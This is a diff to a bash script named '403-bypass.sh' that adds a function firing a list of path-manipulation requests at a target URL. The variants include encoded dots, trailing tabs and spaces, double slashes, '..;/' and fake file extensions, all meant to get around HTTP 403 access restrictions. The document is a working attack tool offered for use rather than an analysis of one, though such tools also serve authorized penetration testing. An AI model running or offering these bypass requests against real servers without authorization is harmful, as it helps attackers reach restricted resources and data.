@@ -25,6 +25,25 @@ function make_request() {
     echo -e "[$(date +'%Y-%m-%d %H:%M:%S')] -> ${url} ${extra_headers}\n  Status: ${http_code}, Size: ${size} bytes"
 }
 
+function bypass_methods() {
+    make_request "${TARGET_URL}/${TARGET_PATH}"
+    make_request "${TARGET_URL}/%2e/${TARGET_PATH}"
+    make_request "${TARGET_URL}/${TARGET_PATH}/."
+    make_request "${TARGET_URL}//${TARGET_PATH}//"
+    make_request "${TARGET_URL}/./${TARGET_PATH}/./"
+    make_request "${TARGET_URL}/${TARGET_PATH}%20"
+    make_request "${TARGET_URL}/${TARGET_PATH}%09"
+    make_request "${TARGET_URL}/${TARGET_PATH}?"
+    make_request "${TARGET_URL}/${TARGET_PATH}.html"
+    make_request "${TARGET_URL}/${TARGET_PATH}/?anything"
+    make_request "${TARGET_URL}/${TARGET_PATH}#"
+    make_request "${TARGET_URL}/${TARGET_PATH}/*"
+    make_request "${TARGET_URL}/${TARGET_PATH}.php"
+    make_request "${TARGET_URL}/${TARGET_PATH}.json"
+    make_request "${TARGET_URL}/${TARGET_PATH};/"
+    make_request "${TARGET_URL}/${TARGET_PATH}..;/"
+}
+
 if [[ $# -ne 2 ]]; then
     echo "Invalid arguments. Usage: ./403-bypass.sh [URL] [path]"
     exit 1
